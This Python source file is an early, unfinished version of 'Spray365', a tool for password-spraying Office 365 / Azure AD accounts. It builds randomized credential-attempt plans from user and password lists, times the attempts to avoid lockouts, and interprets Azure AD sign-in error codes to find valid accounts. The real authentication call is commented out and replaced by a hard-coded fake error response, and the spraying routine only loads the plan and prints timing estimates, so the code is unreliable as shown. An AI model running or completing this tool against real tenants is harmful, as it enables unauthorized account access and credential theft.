from msal import PublicClientApplication
import msal
from colorama import Fore
import os
import sys
import argparse
import datetime
import random
import itertools
import json
from json import JSONEncoder


class Credential:
    def __init__(self, domain, username, password, client_id, endpoint, delay, initial_delay=0):
        self.domain = domain
        self.username = username
        self.password = password
        self.client_id = client_id
        self.endpoint = endpoint
        self.delay = delay
        self.initial_delay = initial_delay

    @property
    def email_address(self):
        return "%s@%s" % (self.username, self.domain)

    def authenticate(self, proxies, verify_ssl):
        global auth_app

        scopes = ["%s/.default" % self.endpoint]

        # raw_result = auth_app.acquire_token_by_username_password(
        #    username=self.email_address, password=self.password, scopes=scopes)

        raw_result = {
            "error": True,
            "error_description": "Something magical",
            "error_codes": [
                50126,
                50127
            ]
        }

        result = AuthResult(self)

        if "error" not in raw_result:
            result.set_auth_status(complete_success=True, partial_success=None)
            return result

        if "error_codes" in raw_result:
            result.error_codes = raw_result["error_codes"]

        if "error_description" in raw_result:
            result.raw_error_description = raw_result["error_description"]

        result.process_errors()
        return result


class CredentialEncoder(JSONEncoder):
    def default(self, o):
        return o.__dict__


class AuthError:
    _error_message = ""
    _error_code = None

    def __init__(self, message, code):
        self._error_message = message
        self._error_code = code

    @property
    def error_message(self):
        return self._error_message

    @property
    def error_code(self):
        return self._error_code


class AuthResult:
    _auth_complete_success = False
    _auth_partial_success = False
    _auth_errors = []

    credential = None
    raw_error_description = None
    error_codes = []

    def __init__(self, credential):
        self.credential = credential

    @property
    def auth_partial_success(self):
        return self._auth_partial_success

    @property
    def auth_complete_success(self):
        return self._auth_complete_success

    @property
    def auth_errors(self):
        return self._auth_errors

    def process_errors(self):
        for error_code in self.error_codes:
            message = None

            if error_code == 50034:
                message = "User not found"
            elif error_code == 50053:
                message = "Account locked"
            elif error_code == 50055:
                message = "Account password expired"
            elif error_code == 50057:
                message = "Account disabled"
            elif error_code == 50158:
                message = "External validation failed (conditional access policy)"
            elif error_code == 50076:
                message = "Multi-Factor Authentication Required"
            elif error_code == 50126:
                message = "Invalid credentials"
            else:
                message = "An unknown error occurred"

            self._auth_errors.append(AuthError(message, error_code))


def print_banner():

    version = "0.0.1-alpha"

    possible_colors = [
        Fore.CYAN,
        Fore.GREEN,
        Fore.RED,
        Fore.LIGHTBLUE_EX,
        Fore.LIGHTCYAN_EX,
        Fore.LIGHTGREEN_EX,
        Fore.LIGHTMAGENTA_EX,
        Fore.LIGHTRED_EX,
        Fore.LIGHTYELLOW_EX
    ]

    colors = random.sample(possible_colors, 8)
    colors_tuple = tuple(colors)

    lines = [
        "\n%s███████╗%s██████╗ %s██████╗ %s █████╗ %s██╗   ██╗%s██████╗ %s ██████╗ %s███████╗" % colors_tuple,
        "%s██╔════╝%s██╔══██╗%s██╔══██╗%s██╔══██╗%s╚██╗ ██╔╝%s╚════██╗%s██╔════╝ %s██╔════╝" % colors_tuple,
        "%s███████╗%s██████╔╝%s██████╔╝%s███████║%s ╚████╔╝ %s █████╔╝%s███████╗ %s███████╗" % colors_tuple,
        "%s╚════██║%s██╔═══╝ %s██╔══██╗%s██╔══██║%s  ╚██╔╝  %s ╚═══██╗%s██╔═══██╗%s╚════██║" % colors_tuple,
        "%s███████║%s██║     %s██║  ██║%s██║  ██║%s   ██║   %s██████╔╝%s ██████╔╝%s███████║" % colors_tuple,
        "%s╚══════╝%s╚═╝     %s╚═╝  ╚═╝%s╚═╝  ╚═╝%s   ╚═╝   %s╚═════╝ %s ╚═════╝ %s╚══════╝" % colors_tuple,
        "%30sBy MarkoH17 (https://github.com/MarkoH17)" % colors[3],
        "%s%sVersion: %s\n" % ((" " * (57 - len(version))), colors[3], version)
    ]
    [print(line) for line in lines]
    sys.stdout.write(Fore.RESET)


def initialize():
    parser = argparse.ArgumentParser(
        prog="spray365.py",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    mode_argument_group = parser.add_mutually_exclusive_group(
        required=True)

    mode_argument_group.add_argument(
        "-g", "--generate", type=str, help="File to store the generated Spray365 execution plan")
    mode_argument_group.add_argument(
        "-s", "--spray", type=str, help="File containing Spray365 execution plan to use for password spraying")

    parser.add_argument("-d", "--domain", type=str,
                        help="Office 365 domain to authenticate against")

    parser.add_argument("-u", "--user_file", type=str,
                        help="File containing usernames to spray (one per line without domain)")

    password_argument_group = parser.add_mutually_exclusive_group()
    password_argument_group.add_argument("-p", "--password", type=str,
                                         help="Password to spray")
    password_argument_group.add_argument("-pf", "--password_file", type=str,
                                         help="File containing passwords to spray (one per line)")

    parser.add_argument("--delay", type=int,
                        help="Delay in seconds to wait between authentication attempts", default=30)
    parser.add_argument("--lockout", type=int,
                        help="Number of account lockouts to observe before aborting spraying session (disable with 0)", default=5)
    parser.add_argument("--logging", type=bool,
                        help="Enable logging to a file", default=True)

    parser.add_argument(
        "--proxy", type=str, help="HTTP Proxy URL (format: http[s]://proxy.address:port)")

    parser.add_argument("--stop_on_success", type=bool,
                        help="Stop password spraying after identifying first usable credential", default=False)

    parser.add_argument("-k", "--verify_ssl", type=bool,
                        help="Enforce valid SSL certificates", default=False)

    parser.add_argument("-cid", "--aad_client", type=str,
                        help="Client ID used during authentication workflow (None for random selection, specify multiple in a comma-separated string)", default=None, required=False)

    parser.add_argument("-eid", "--aad_endpoint", type=str,
                        help="Endpoint ID to specify during authentication workflow (None for random selection, specify multiple in a comma-separated string)", default=None, required=False)

    parser.add_argument("-S", "--shuffle_auth_order", type=bool,
                        help="Shuffle order of authentication attempts so that each iteration over the user accounts will spray them in a different order, and with a random arrangement of passwords. Be careful with this option, as it reduces the time between successive authentication attempts for a given user to a minimum of DELAY * 1 seconds (a consecutive attempt). Consider using -mD/--min_cred_loop_delay option to enforce a minimum delay", default=False)

    parser.add_argument("-SO", "--shuffle_optimization_attempts", type=int,
                        help="Number of random execution plans to generate for identifying the fastest execution plan", default=10)

    parser.add_argument("-mD", "--min_cred_loop_delay", type=int,
                        help="Minimum time to wait between successive attempts per user authentication attempt (disable with 0)", default=0)

    parser.add_argument("-R", "--resume_index", type=int,
                        help="Position in the execution plan to start spraying credentials from", default=0)

    args = parser.parse_args()
    validate_args(args)
    main(args)


def validate_args(args):
    if args.generate is not None:
        # Validate args needed for generation

        generate_arg_valid = args.generate is not None and not os.path.isfile(
            args.generate)

        domain_arg_valid = args.domain is not None
        user_arg_valid = args.user_file is not None and os.path.isfile(
            args.user_file)
        password_arg_valid = (
            (args.password_file is not None and os.path.isfile(args.password_file)) or
            (args.password is not None)
        )

        delay_arg_valid = args.delay is not None and args.delay >= 0

        min_cred_loop_delay_arg_valid = args.min_cred_loop_delay is not None and args.min_cred_loop_delay >= 0
        if not generate_arg_valid:
            print_warning(
                "Generate argument is invalid (does this file already exist?)")
        if not domain_arg_valid:
            print_warning("Domain argument is invalid")
        if not user_arg_valid:
            print_warning("User argument (--user / --user_file) is invalid")
        if not password_arg_valid:
            print_warning(
                "User argument (--password / --password_file) is invalid")
        if not delay_arg_valid:
            print_warning("Delay argument is invalid")

        if not (
            generate_arg_valid and
            domain_arg_valid and
            user_arg_valid and
            password_arg_valid and
            delay_arg_valid and

            min_cred_loop_delay_arg_valid
        ):
            print_error("Arguments are invalid")
            sys.exit(1)
    else:
        # Validate args needed for spraying
        spray_arg_valid = args.spray is not None and os.path.isfile(
            args.spray)

        lockout_arg_valid = args.lockout is not None and args.lockout >= 0

        resume_index_arg_valid = args.resume_index is not None and args.resume_index >= 0

        if not spray_arg_valid:
            print_warning(
                "Spray argument is invalid (does this file exist?)")
        if not lockout_arg_valid:
            print_warning("Lockout argument is invalid")

        if not (
            spray_arg_valid and
            lockout_arg_valid and
            resume_index_arg_valid
        ):
            print_error("Arguments are invalid")
            sys.exit(1)


def get_credential_combinations(domain, usernames, passwords, client_ids, endpoints, delay):
    combinations = []

    for password in passwords:
        for username in usernames:
            combinations.append(
                Credential(domain, username, password, random.choice(
                    client_ids), random.choice(endpoints), delay)
            )
    return combinations


def group_credential_combinations_by_key(combinations, grouping_func):
    sorted_combinations = sorted(combinations, key=grouping_func)

    grouped_combinations = {}
    for key, value in itertools.groupby(sorted_combinations, grouping_func):
        grouped_combinations[key] = list(value)
    return grouped_combinations


def calculate_random_delays(auth_creds, min_delay_time):
    for spray_group in list(auth_creds.keys())[1:]:
        for cred_idx, cred in enumerate(auth_creds[spray_group]):
            previous_cred_vals = next(
                ((c_idx, c) for c_idx, c in enumerate(auth_creds[spray_group - 1]) if c.username == cred.username), None)
            previous_cred_idx = previous_cred_vals[0]

            previous_group_delays = sum([
                c.delay + c.initial_delay for c in auth_creds[spray_group - 1][previous_cred_idx:]])
            current_group_delays = sum([
                c.delay + c.initial_delay for c in auth_creds[spray_group][:cred_idx]
            ])
            prior_delays = previous_group_delays + current_group_delays

            if prior_delays < min_delay_time:
                additional_needed_delay = min_delay_time - prior_delays
                cred.initial_delay = additional_needed_delay


def get_spray_runtime(auth_creds):
    runtime = 0
    if type(auth_creds) is dict:
        for spray_group in list(auth_creds.keys()):
            group_time = sum([
                c.delay + c.initial_delay for c in auth_creds[spray_group]
            ])
            runtime += group_time
    elif type(auth_creds) is list:
        runtime = sum([
            c.delay + c.initial_delay for c in auth_creds
        ])
    return runtime


def generate_execution_plan(args):
    password_list = []
    user_list = []
    domain = args.domain

    if args.password:
        password_list.append(args.password)
    else:
        with open(args.password_file, "r") as password_file_handle:
            password_list = password_file_handle.read().splitlines()

    with open(args.user_file, "r") as user_file_handle:
        user_list = user_file_handle.read().splitlines()

    delay = args.delay

    print_info("Generating execution plan for %d credentials.." %
               (len(user_list) * len(password_list)))

    # print_info("Password spraying %d users with %d password(s) using a %d second delay on %s" % (
    #    len(user_list), len(password_list), delay, domain))

    spray_duration = len(user_list) * len(password_list) * delay
    # spray_completion_datetime = (datetime.datetime.now(
    # ) + datetime.timedelta(seconds=spray_duration)).strftime("%Y-%m-%d %H:%M:%S")

    # print_info("Password spraying will take at least %d seconds, and will complete by %s (approximately)" % (
    #    spray_duration, spray_completion_datetime))

    endpoint = "https://proxy.cloudwebappproxy.net/registerapp"
    client_id = "0000000c-0000-0000-c000-000000000000"

    '''
    global auth_app
    auth_app = PublicClientApplication(
        client_id,
        authority="https://login.microsoftonline.com/organizations")
    '''

    auth_creds = {}

    if args.shuffle_auth_order:
        optimization_tries = args.shuffle_optimization_attempts

        temp_auth_creds = {}
        possible_auth_creds = {}

        for i in range(0, optimization_tries):
            print_info("Generated potential execution plan %d/%d" %
                       (i+1, optimization_tries))
            raw_combinations = get_credential_combinations(
                domain, user_list, password_list, [client_id], [endpoint], delay)
            # Generate all combinations of users passwords, then
            # Group them into entire sets of users
            auth_combinations_by_user = group_credential_combinations_by_key(
                raw_combinations, lambda cred: cred.username)

            for user in auth_combinations_by_user.keys():
                random.shuffle(auth_combinations_by_user[user])

            group_index = 0
            while sum([len(auth_combinations_by_user[u]) for u in auth_combinations_by_user.keys()]) > 0:
                cred_grouping = []
                users = list(auth_combinations_by_user.keys())
                random.shuffle(users)

                while users:
                    random_user_index = random.randrange(0, len(users))
                    user = users.pop(random_user_index)

                    random_cred_index = random.randrange(
                        0, len(auth_combinations_by_user[user]))
                    random_cred = auth_combinations_by_user[user].pop(
                        random_cred_index)

                    cred_grouping.append(random_cred)
                temp_auth_creds[group_index] = cred_grouping
                group_index += 1

            calculate_random_delays(temp_auth_creds, args.min_cred_loop_delay)

            runtime = get_spray_runtime(temp_auth_creds)
            possible_auth_creds[i] = (runtime, temp_auth_creds)
        runtimes = [(spray_attempt[1][0], spray_attempt[0])
                    for spray_attempt in possible_auth_creds.items()]

        fastest_runtime = min(runtimes)
        slowest_runtime = max(runtimes)
        auth_creds = possible_auth_creds[fastest_runtime[1]][1]

        print_info("Optimal execution plan identified (#%d)" %
                   (fastest_runtime[1]+1))
        print_info("Fastest runtime will take %d seconds, %d seconds faster than the slowest execution plan generated" % (
            fastest_runtime[0],
            (slowest_runtime[0] - fastest_runtime[0])

        ))
        print_info("Using this randomized execution plan will take %d seconds longer than spraying with the non-random approach" %
                   (fastest_runtime[0] - spray_duration))

    else:
        raw_combinations = get_credential_combinations(
            domain, user_list, password_list, [client_id], [endpoint], delay)

        auth_combinations_by_password = group_credential_combinations_by_key(
            raw_combinations, lambda cred: cred.password)
        auth_creds = auth_combinations_by_password
        print_info("Basic execution plan identified")
        print_info("Fastest runtime will take %d seconds" % spray_duration)

    # Save the execution plan, auth_creds to a file

    cred_execution_plan = []

    for auth_cred_group in auth_creds.keys():
        cred_execution_plan.extend(auth_creds[auth_cred_group])

    json_execution_plan = json.dumps(
        cred_execution_plan, default=lambda o: o.__dict__)
    with open(args.generate, "w") as execution_plan_file:
        execution_plan_file.write(json_execution_plan)
    print_info("Execution plan with %d credentials saved to file '%s'" %
               (len(cred_execution_plan), args.generate))

    '''
    
    for auth_cred_group in auth_creds.keys():
        for cred in auth_creds[auth_cred_group]:
            print("%s:%s (total delay: %d) (before delay: %d) (after delay: %d) " % (
                cred.username, cred.password, (cred.initial_delay + cred.delay), cred.initial_delay, cred.delay))
        print()
    '''


def decode_execution_plan_item(credential_dict):
    return Credential(
        credential_dict["domain"],
        credential_dict["username"],
        credential_dict["password"],
        credential_dict["client_id"],
        credential_dict["endpoint"],
        credential_dict["delay"],
        credential_dict["initial_delay"],

    )


def spray_execution_plan(args):
    print_info("Processing execution plan '%s'" % args.spray)
    execution_plan_file_path = args.spray

    with open(execution_plan_file_path, "r") as execution_plan_file:
        execution_plan_lines = execution_plan_file.readlines()

    execution_plan_str = ""

    for line in execution_plan_lines:
        execution_plan_str += line.strip("\r").strip("\n")

    auth_creds = json.loads(
        execution_plan_str, object_hook=decode_execution_plan_item)

    resume_index = args.resume_index

    number_of_creds_to_spray = len(auth_creds)
    print_info("Identified %d credentials in the provided execution plan" %
               number_of_creds_to_spray)

    if resume_index and resume_index > number_of_creds_to_spray:
        print_error("Resume index '%d' is larger than the number of credentials (%d) in the execution plan % " % (
            resume_index, number_of_creds_to_spray))

    if resume_index:
        print_info("Password spraying will continue with credential %d out of %d" % (
            resume_index, number_of_creds_to_spray))

    estimated_spray_duration = get_spray_runtime(
        auth_creds[resume_index:])
    spray_completion_datetime = (datetime.datetime.now(
    ) + datetime.timedelta(seconds=estimated_spray_duration)).strftime("%Y-%m-%d %H:%M:%S")

    print_info("Password spraying will take at least %d seconds, and should finish around %s" %
               (estimated_spray_duration, spray_completion_datetime))

    lockout_threshold = args.lockout
    if lockout_threshold:
        print_info("Lockout threshold is set to %d accounts" %
                   (lockout_threshold))
    else:
        print_warning("Lockout threshold is disabled")


def main(args):
    generate_mode = args.generate is not None

    if(generate_mode):
        generate_execution_plan(args)
    else:
        spray_execution_plan(args)

    x = 1


def print_error(message, fatal=True):
    print("%s[%s - ERROR]: %s" % (Fore.RED, get_time_str(), message))
    if fatal:
        sys.exit(1)


def print_warning(message):
    print("%s[%s - WARN]: %s" %
          (Fore.YELLOW, get_time_str(), message))


def print_info(message, success=False):
    print("%s[%s - INFO]: %s%s" %
          (Fore.LIGHTBLUE_EX,
           get_time_str(),
           Fore.LIGHTGREEN_EX if success else Fore.LIGHTBLUE_EX,
           message))


def get_time_str():
    date_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return date_str


if __name__ == "__main__":
    print_banner()
    initialize()
